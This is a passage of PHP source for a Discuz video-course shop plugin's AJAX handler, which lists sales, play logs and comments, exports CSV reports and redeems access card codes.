	$count = C::t('#it618_video#it618_video_sale')->count_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$summoney = C::t('#it618_video#it618_video_sale')->sum_money_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$sumtcmoney = C::t('#it618_video#it618_video_sale')->sum_tcmoney_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$multipage = multi($count, $ppp, $page, "plugin.php?id=it618_video:sc_sale".$urlsql);
	
	$salesum= '<td colspan=15>'.it618_video_getlang('s229').'<font color=red>'.$count.'</font> '.it618_video_getlang('s230').'<font color=red>'.$summoney.'</font> '.it618_video_getlang('s415').'<font color=red>'.$sumtcmoney.'</font><span style="float:right">'.it618_video_getlang('s416').'</span></td>';
	
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getsalelist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getsalelist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getsalelist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
			
	foreach(C::t('#it618_video#it618_video_sale')->fetch_all_by_search(
		$ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_video_sale) {
		
		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_sale['it618_pid']);
		
		$jftmp='';
		if($it618_video_sale['it618_jfbl']>0&&$it618_video_sale['it618_price']>0){
			$it618_jfbl=intval($it618_video_sale['it618_jfbl']*$it618_video_sale['it618_price']/100);
			$jftmp=$it618_jfbl.$creditname;
		}
		
		if($it618_video_sale['it618_price']>0||$it618_video_sale['it618_score']>0){
			$pricestr='<font color=red>'.it618_video_getsalemoney($it618_video_sale).'</font>';
		}else{
			$pricestr='<font color=#390>'.$it618_video_lang['s106'].'</font>';
		}
	
		$it618_tc='';
		if($it618_video_sale['it618_tcbl']>0){
			$it618_tc=$it618_video_sale['it618_tcbl'].'% ';
			$it618_tc.='<font color=red>'.$it618_video_sale['it618_tc'].'</font>'.$it618_video_lang['s125'].' ';
			
			if($it618_video_sale['it618_score']>0){
				$tmptc=intval($it618_video_sale['it618_tcbl']*$it618_video_sale['it618_score']/100);
				$jfname=$_G['setting']['extcredits'][$it618_video_sale['it618_jfid']]['title'];
				$it618_tc.=' <font color=red>'.$tmptc.'</font>'.$jfname;
			}
			
			$it618_tc=$it618_video_lang['s1206'].$it618_tc;
		}
		
		$it618_tuitc='';
		if($it618_video_sale['it618_tuitcbl']>0){
			$it618_tuitc=$it618_video_sale['it618_tuitcbl'].'% ';
			$it618_tuitc.='<font color=red>'.$it618_video_sale['it618_tuitc'].'</font>'.$it618_video_lang['s125'].' ';
			
			if($it618_video_sale['it618_score']>0){
				$tmptc=intval($it618_video_sale['it618_tuitcbl']*$it618_video_sale['it618_score']/100);
				$jfname=$_G['setting']['extcredits'][$it618_video_sale['it618_jfid']]['title'];
				$it618_tuitc.=' <font color=red>'.$tmptc.'</font>'.$jfname;
			}
			
			$it618_tuitc='<br>'.$it618_video_lang['s1207'].$it618_tuitc;
		}
		
		if($it618_video_sale['it618_gtypeid']>0){
			$gtypename = it618_video_gettypename($it618_video_sale['it618_gtypeid']);
		}else{
			$gtypename=$it618_video_lang['s1153'];
		}
		
		
		
		$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
		$sale_get.='<tr class="hover">
		<td><input class="checkbox" type="checkbox" id="chk_del'.$it618_video_sale['id'].'" name="delete[]" value="'.$it618_video_sale['id'].'" '.$disabled.'><label for="chk_del'.$it618_video_sale['id'].'">'.$it618_video_sale['id'].'</label></td>
		<td><a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a> <font color=#999>'.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).'</font><br>'.$pricestr.'</td>
		<td>'.$jftmp.'</td>
		<td>'.$it618_tc.$it618_tuitc.'</td>
		<td><font color=blue>'.$gtypename.'*'.$it618_video_sale['it618_count'].'</font><br><a href="'.it618_video_rewriteurl($it618_video_sale['it618_uid']).'" target="_blank">'.it618_video_getusername($it618_video_sale['it618_uid']).'</a> '.$it618_video_sale['it618_tel'].'</td>
		<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_sale['it618_time']).'</font></td>
		</tr>';

	}

	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /><script>'.$tmpjs.'</script></td>';
	
	echo $salesum.'it618_split'.$sale_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="play_get"){
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$ppp = 9;
	
	$count = C::t('#it618_video#it618_video_play')->count_by_search('','',$ShopId, $_GET['uid'], $_GET['pid'], $_GET['vid'], $_GET['ips']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$salesum= '<td colspan=15>'.it618_video_getlang('s671').'<font color=red>'.$count.'</font></td>';
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getplaylist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getplaylist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getplaylist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
			
	foreach(C::t('#it618_video#it618_video_play')->fetch_all_by_search(
		'','it618_etime desc',$ShopId, $_GET['uid'], $_GET['pid'], $_GET['vid'], $_GET['ips'],$startlimit,$ppp
	) as $it618_video_play) {
		
		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_play['it618_pid']);
		$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
		$pnamestr='<a href="'.$tmpurl.'" target="_blank"><font color=#333>'.$it618_video_goods['it618_name'].'</font></a>';
		
		$it618_video_goods_video = C::t('#it618_video#it618_video_goods_video')->fetch_by_id($it618_video_play['it618_vid']);
		$tmpurl=it618_video_getrewrite('video_lesson',$it618_video_goods_video['id'],'plugin.php?id=it618_video:lesson&lid='.$it618_video_goods_video['id']);
		if($it618_video_goods_video['it618_liveid']>0){
			$it618_video_live=C::t('#it618_video#it618_video_live')->fetch_by_id($it618_video_goods_video['it618_liveid']);
			$vnamestr='<a href="'.$tmpurl.'" target="_blank">'.$it618_video_live['it618_name'].'</a>';
		}else{
			$vnamestr='<a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods_video['it618_name'].'</a>';
		}

		$playtime='';$curtime='';
		if($it618_video_play['it618_playtime']>0){
			$playtime=it618_video_getvideotime($it618_video_play['it618_playtime']);
			$curtime='<font color=blue>'.it618_video_getplaytime($it618_video_play['it618_curtime']).'</font> / '.it618_video_getplaytime($it618_video_play['it618_alltime']);
		}
		
		$play_get.='<tr class="hover">
		<td><div style="height:40px;line-height:20px">'.$pnamestr.'<br>'.$vnamestr.'</div></td>
		<td><a href="'.it618_video_rewriteurl($it618_video_play['it618_uid']).'" target="_blank">'.it618_video_getusername($it618_video_play['it618_uid']).'</a></td>
		<td>'.$playtime.'</td>
		<td>'.$curtime.'</td>
		<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_play['it618_btime']).'<br>'.date('Y-m-d H:i:s', $it618_video_play['it618_etime']).'</font></td>
		<td>'.$it618_video_play['it618_ip'].'</td>
		<td><textarea style="width:190px;height:40px;border:none;background:none">'.$it618_video_play['it618_ips'].'</textarea></td>
		</tr>';

	}
	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	
	echo $playsum.'it618_split'.$play_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="playsum_get"){
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$ppp = 14;
	
	$count = C::t('#it618_video#it618_video_play')->countsum_by_search('','',$ShopId, $_GET['uid'], $_GET['pid']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$salesum= '<td colspan=15>'.it618_video_getlang('s671').'<font color=red>'.$count.'</font></td>';
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getplaylist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getplaylist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getplaylist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
			
	foreach(C::t('#it618_video#it618_video_play')->fetchsum_all_by_search(
		'','',$ShopId, $_GET['uid'], $_GET['pid'],$startlimit,$ppp
	) as $it618_video_play) {
		
		$pnamestr=$it618_video_lang['s1568'];
		if($it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_play['it618_pid'])){
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
			$pnamestr='<a href="'.$tmpurl.'" target="_blank"><font color=#333>'.$it618_video_goods['it618_name'].'</font></a>';
		}

		$playtime='0';
		if($it618_video_play['sumtime']>0){
			$playtime=it618_video_getvideotime($it618_video_play['sumtime']);
		}
		
		$play_get.='<tr class="hover">
		<td>'.$pnamestr.' <font color=#999>'.$it618_video_lang['s1567'].$it618_video_play['it618_pid'].'</font></td>
		<td><a href="'.it618_video_rewriteurl($it618_video_play['it618_uid']).'" target="_blank">'.it618_video_getusername($it618_video_play['it618_uid']).'</a></td>
		<td>'.$playtime.'</td>
		</tr>';

	}
	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	
	echo $playsum.'it618_split'.$play_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="playsum_dao"){	
	$strtmp=$it618_video_lang['s1571']."\n";
	foreach(C::t('#it618_video#it618_video_play')->fetchsum_all_by_search(
		'','',$ShopId, $_GET['uid'], $_GET['pid'],$startlimit,$ppp
	) as $it618_video_play) {

		$playtime='0';
		if($it618_video_play['sumtime']>0){
			$playtime=it618_video_getvideotime($it618_video_play['sumtime']);
		}
		
		$strtmp.=$it618_video_goods['it618_name']."(".$it618_video_goods['id']."),".it618_video_getusername($it618_video_play['it618_uid'])."(".$it618_video_play['it618_uid']."),".$playtime."\n";
		$datacount=$datacount+1;
	}
	
	$datapath1=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/';
	if(!file_exists($datapath1)) {
		mkdir($datapath1);
	}
	$datapath=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/dao/';
	if(!file_exists($datapath)) {
		mkdir($datapath);
	}
	
	$timestr=md5(date("YmdHis").FORMHASH). '_' . $datacount;
	it618_video_delfile($datapath);
	
	@$fp = fopen($datapath.$timestr.'.csv',"w");
	if(!$fp){
		echo "system error";
		exit();
	}else {
		fwrite($fp,$strtmp);
		fclose($fp);
	}
	
	echo $_G['siteurl'].'source/plugin/it618_video/kindeditor/data/shop'.$ShopId.'/dao/'.$timestr.'.csv';
	exit;
}


if($_GET['ac']=="shoppl_get"){
	$page = max(1, intval($_GET['page']));
	$ppp = 10;
	$startlimit = ($page - 1) * $ppp;
	$count = C::t('#it618_video#it618_video_goods_video_pl')->count_by_search('','',$ShopId,$_GET['pid'],$_GET['vid'],$_GET['uid']);
	$it618_video_goods_video_pls=C::t('#it618_video#it618_video_goods_video_pl')->fetch_all_by_search('','id desc',$ShopId,$_GET['pid'],$_GET['vid'],$_GET['uid'],$startlimit,$ppp);
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getpllist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getpllist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getpllist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	foreach($it618_video_goods_video_pls as $it618_video_goods_video_pl) {
		
		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_goods_video_pl['it618_pid']);
		$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
		$pnamestr='<a href="'.$tmpurl.'" target="_blank"><font color=#333>'.$it618_video_goods['it618_name'].'</font></a>';
		
		$it618_video_goods_video = C::t('#it618_video#it618_video_goods_video')->fetch_by_id($it618_video_goods_video_pl['it618_vid']);
		$tmpurl=it618_video_getrewrite('video_lesson',$it618_video_goods_video['id'],'plugin.php?id=it618_video:lesson&lid='.$it618_video_goods_video['id']);
		$vnamestr='<a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods_video['it618_name'].'</a>';
		
		$strtmpdel='<a href="javascript:" style="float:right" onclick="if(confirm(\''.it618_video_getlang('t372').'\'))delpl(\''.$it618_video_goods_video_pl['id'].'\')">'.it618_video_getlang('t373').'</a><a href="javascript:" style="float:right;margin-right:6px" onclick="hfpl(\''.$it618_video_goods_video_pl['id'].'\')">'.it618_video_getlang('s772').'</a>';
		
		$it618_hfcontent='';
		if($it618_video_goods_video_pl['it618_hfcontent']!=''){
			$it618_hfcontent='<div style="color:red">'.str_replace('[br]','<br>',dhtmlspecialchars($it618_video_goods_video_pl['it618_hfcontent'])).'</div>';
		}
		
		$pl_get.='<tr class="hover">
		<td><div style="line-height:20px;width:300px">'.$pnamestr.'<br>'.$vnamestr.'</div></td>
		<td width="400">'.str_replace('[br]','<br>',dhtmlspecialchars($it618_video_goods_video_pl['it618_content'])).'</td>
		<td width="400">'.$it618_hfcontent.$strtmpdel.'</td>
		<td><a href="'.it618_video_rewriteurl($it618_video_goods_video_pl['it618_uid']).'" target="_blank">'.it618_video_getusername($it618_video_goods_video_pl['it618_uid']).'</a><font color=#999><br>'.date('Y-m-d H:i:s', $it618_video_goods_video_pl['it618_time']).'</font></td>
		</tr>';
	}
	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	
	echo '<td colspan=15>'.it618_video_getlang('s671').'<font color=red>'.$count.'</font></td>it618_split'.$pl_get."it618_split".$multipage;
}


if($_GET['ac']=="getgoodstype"){
	if($it618_video_goods_type=C::t('#it618_video#it618_video_goods_type')->fetch_by_idok($_GET['it618_gtypeid'])){
		
		$goodspricestr=it618_video_getgoodsprice($it618_video_goods_type,'vipzk');
		
		if($_GET['wap']==1){
			if($it618_video_goods_type['it618_price']>0){
				$goodspricestr.=' <del style="color:#999;font-size:12px"><em style="font-size:12px">&yen;</em>'.$it618_video_goods_type['it618_price'].'</del>';
			}
		}
		
		if($it618_video_goods_type['it618_counttype']==1){
			$tmpcount='<font color=#999>'.$it618_video_lang['s1067'].' <font style="color:red">'.$it618_video_goods_type['it618_count'].'</font></font> ';
			
			if($it618_video_goods_type['it618_xgcount']>0){
				if($it618_video_goods_type['it618_xgtime']>0){
					$tmpxgstr='<font color=#999>('.$it618_video_lang['t24'].$it618_video_goods_type['it618_xgtime'].$it618_video_lang['t25'].$it618_video_goods_type['it618_xgcount'].$it618_video_lang['t57'].')</font>';
				}else{
					$tmpxgstr='<font color=#999>('.$it618_video_lang['t71'].$it618_video_goods_type['it618_xgcount'].$it618_video_lang['t57'].')</font>';
				}
			}
			
		}

		$salecount=$it618_video_goods_type['it618_salecount'];
		
		if($_GET['wap']==1){
			echo $goodspricestr.'it618_split'.$tmpcount.$tmpxgstr.'it618_split'.$it618_video_goods_type['id'].'it618_split'.$tmpxgstr;
		}else{
			echo $goodspricestr.'it618_split'.$tmpcount.$tmpxgstr.'it618_split'.$it618_video_goods_type['id'].'it618_split'.$it618_video_goods_type['it618_price'];
		}
	}else{
		echo 'reload';
	}
	exit;
}


if($_GET['ac']=="readkm"){
	if($it618_video_goods_km = C::t('#it618_video#it618_video_goods_km')->fetch_by_it618_code($_GET['kmcode'])){
		if($it618_video_goods_km['it618_etime']==0){
			$it618_etime=$it618_video_lang['s2296'];
		}else{
			$it618_etime=date('Y-m-d H:i:s', $it618_video_goods_km['it618_etime']);
		}
		
		if($it618_video_goods_km['it618_xgtime']>0){
			$it618_xgtime='<font color=red>'.$it618_video_goods_km['it618_xgtime'].'</font>'.$it618_video_lang['s2300'];
		}else{
			$it618_xgtime=$it618_video_lang['s2301'];
		}
		
		$it618_video_goods_type=C::t('#it618_video#it618_video_goods_type')->fetch_by_id($it618_video_goods_km['it618_typeid']);
		$tmptitle=it618_video_getgoodstypename($it618_video_goods_type);

		echo "<font color=#999>".$it618_video_lang['s2298']."<font color=red>".$tmptitle.'</font> '.$it618_video_lang['s2299'].'<font color=green>'.$it618_xgtime.'</font> '.$it618_video_lang['s2297'].'<font color=green>'.$it618_etime.'</font></font>';
	}else{
		if($it618_video_salekm = C::t('#it618_video#it618_video_salekm')->fetch_by_it618_code($_GET['kmcode'])){
			echo '<font color=red>'.$it618_video_lang['s2126'].'</font>';exit;
		}else{
			echo '<font color=red>'.$it618_video_lang['s2295'].'</font>';exit;
		}
	}
	exit;
}


if($_GET['ac']=="salekm"){	
	if($it618_video_goods_km = C::t('#it618_video#it618_video_goods_km')->fetch_by_it618_code($_GET['kmcode'])){
		
		if($it618_video_goods_km['it618_etime']>0&&$it618_video_goods_km['it618_etime']<$_G['timestamp']){
			echo $it618_video_lang['s2305'];exit;
		}
		
		if($it618_video_goods_km['it618_xgtime']>0){
			$time=$_G['timestamp']-$it618_video_goods_km['it618_xgtime']*3600*24;
			$buycount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_video_salekm')." where it618_typeid=".$it618_video_goods_km['it618_typeid']." and it618_time>$time and it618_uid=".$uid);
			if($buycount>0){
				echo $it618_video_lang['s2302'].$it618_video_goods_km['it618_xgtime'].$it618_video_lang['s2303'].$buycount.$it618_video_lang['s2304'];exit;
			}
		}
		
		$it618_video_goods_type = C::t('#it618_video#it618_video_goods_type')->fetch_by_id($it618_video_goods_km['it618_typeid']);
		
		$pid=$it618_video_goods_type['it618_pid'];
		$lid=$it618_video_goods_type['it618_lid'];
		$vid=$it618_video_goods_type['it618_vid'];
		
		$videopower_sale=it618_video_getpower_sale($uid,$pid,$lid,$vid);
		if($videopower_sale['state']==1){
			echo $videopower_sale['about'];exit;
		}
		
		$tmptime=$_G['timestamp'];
		$id = C::t('#it618_video#it618_video_salekm')->insert(array(
			'it618_uid' => $uid,
			'it618_typeid' => $it618_video_goods_km['it618_typeid'],
			'it618_code' => $it618_video_goods_km['it618_code'],
			'it618_bz' => $it618_video_goods_km['it618_bz'],
			'it618_xgtime' => $it618_video_goods_km['it618_xgtime'],
			'it618_etime' => $it618_video_goods_km['it618_etime'],
			'it618_addtime' => $it618_video_goods_km['it618_addtime'],
			'it618_time' => $tmptime
		), true);
		
		if($it618_video_goods_km['it618_usedel']==1){
			C::t('#it618_video#it618_video_goods_km')->delete_by_id($it618_video_goods_km['id']);
		}
		
		$timevalue=it618_video_getetime($it618_video_goods_type['it618_timetype'],$it618_video_goods_type['it618_time']);
		
		if($it618_video_goods_time=C::t('#it618_video#it618_video_goods_time')->fetch_by_uid_pid_lid_vid($uid,$pid,$lid,$vid)){
			if($timevalue==0){
				$it618_etime=0;
			}else{
				if($it618_video_goods_time['it618_etime']>$_G['timestamp']){
					$it618_etime=$it618_video_goods_time['it618_etime']+$timevalue;
				}else{
					$it618_etime=$_G['timestamp']+$timevalue;
				}
			}
			
			DB::query("update ".DB::table('it618_video_goods_time')." set it618_etime=".$it618_etime." where id=".$it618_video_goods_time['id']);
		}else{
			if($timevalue==0){
				$it618_etime=0;
			}else{
				$it618_etime=$_G['timestamp']+$timevalue;
			}
			
			$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($pid);
			C::t('#it618_video#it618_video_goods_time')->insert(array(
				'it618_shopid' => $it618_video_goods['it618_shopid'],
				'it618_pid' => $pid,
				'it618_lid' => $lid,
				'it618_vid' => $vid,
				'it618_uid' => $uid,
				'it618_etime' => $it618_etime
			), true);	
		}
		
		echo 'it618_splitokit618_split'.$it618_video_lang['s2306'];exit;
	}else{
		if($it618_video_salekm = C::t('#it618_video#it618_video_salekm')->fetch_by_it618_code($_GET['kmcode'])){
			echo '<font color=red>'.$it618_video_lang['s2126'].'</font>';exit;
		}else{
			echo '<font color=red>'.$it618_video_lang['s2295'].'</font>';exit;
		}
	}
}


if($_GET['ac']=="km_dao"){	
	$shopadmin=explode(",",$it618_video['video_shopadmin']);
	if(!in_array($_G['uid'],$shopadmin)){
		if($it618_video_shop['it618_issalekm']==1){
			if($it618_video_shop['it618_uid']!=$_G['uid']){
				echo $it618_video_lang['s513'];exit;
			}
		}else{
			echo $it618_video_lang['s513'];exit;
		}
	}
	
	$typeid=intval($_GET['typeid']);
	$it618_video_goods_type = C::t('#it618_video#it618_video_goods_type')->fetch_by_id($typeid);

	$tmptitle=it618_video_getgoodstypename($it618_video_goods_type);
	
	$strtmp=$tmptitle."\n".$it618_video_lang['s2313']."\n";
	foreach(C::t('#it618_video#it618_video_goods_km')->fetch_all_by_search(
		$it618sql,'id desc',$typeid,it618_video_utftogbk($_GET['it618_bzfind']),$startlimit,$ppp
	) as $it618_video_goods_km) {
		
		if($it618_video_goods_km['it618_etime']==0){
			$it618_etime=$it618_video_lang['s2296'];
		}else{
			$it618_etime=date('Y-m-d H:i:s', $it618_video_goods_km['it618_etime']);
		}
		
		if($it618_video_goods_km['it618_xgtime']>0){
			$it618_xgtime='<font color=red>'.$it618_video_goods_km['it618_xgtime'].'</font>'.$it618_video_lang['s2085'];
		}else{
			$it618_xgtime=$it618_video_lang['s2086'];
		}
		
		$strtmp.=$it618_video_goods_km['it618_code'].",".$it618_xgtime.",".$it618_etime.",".$it618_video_goods_km['it618_bz'].",".date('Y-m-d H:i:s', $it618_video_goods_km['it618_addtime'])."\n";
		$datacount=$datacount+1;
	}
	
	$datapath1=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/';
	if(!file_exists($datapath1)) {
		mkdir($datapath1);
	}
	$datapath=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/dao/';
	if(!file_exists($datapath)) {
		mkdir($datapath);
	}
	
	$timestr=md5(date("YmdHis").FORMHASH).'_'.$typeid. '_' . $datacount;
	it618_video_delfile($datapath);
	
	@$fp = fopen($datapath.$timestr.'.csv',"w");
	if(!$fp){
		echo "system error";
		exit();
	}else {
		fwrite($fp,$strtmp);
		fclose($fp);
	}
	
	echo $_G['siteurl'].'source/plugin/it618_video/kindeditor/data/dao/'.$timestr.'.csv';
	exit;
}

if($_GET['ac']=="salekmlist_get"){
	if($_GET['ac1']=='pcmysalekm')$ppp = 10;
	if($_GET['ac1']=='wapmysalekm')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$it618_video_salekms=C::t('#it618_video#it618_video_salekm')->fetch_all_by_search($it618sql,'id desc',$_GET['typeid'],$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp);
	$count=C::t('#it618_video#it618_video_salekm')->count_by_search($it618sql,'',$_GET['typeid'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	$funname='getmysalekmlist';
	
	$n=0;
	foreach($it618_video_salekms as $it618_video_salekm) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_video_goods_type = C::t('#it618_video#it618_video_goods_type')->fetch_by_id($it618_video_salekm['it618_typeid']);

		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_goods_type['it618_pid']);
		
		$gtypename = it618_video_gettypename($it618_video_salekm['it618_typeid']);
		
		$pid=$it618_video_goods_type['it618_pid'];
		$lid=$it618_video_goods_type['it618_lid'];
		$vid=$it618_video_goods_type['it618_vid'];
		$goodsabout=it618_video_getgoodsabout($pid,$lid,$vid);

		if($_GET['ac1']=='pcmysalekm'){
			
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
			
			$salelist_get.='<tr class="hover">
						<td><div><a href="'.$tmpurl.'" target="_blank">'.$it618_video_goods['it618_name'].'</a><br>
						<font color="#999">'.$goodsabout['about'].'</font></div></td>
						<td>'.$goodsabout['type'].' <font color="red">'.$gtypename.'</font></td>
						<td>'.$it618_video_salekm['it618_code'].'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_salekm['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmysalekm'){
			
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
					
			$salelist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_video_goods['it618_name'].'</a><br>
							<font color="#999">'.$goodsabout['about'].'</font><br>
							<font color=#ccc>'.date('Y-m-d H:i:s', $it618_video_salekm['it618_time']).'</font><br>
							<span style="float:right;color:red">'.$goodsabout['type'].' '.$gtypename.'</span><font color="#999">'.$it618_video_salekm['it618_code'].'</font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmysalekm'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
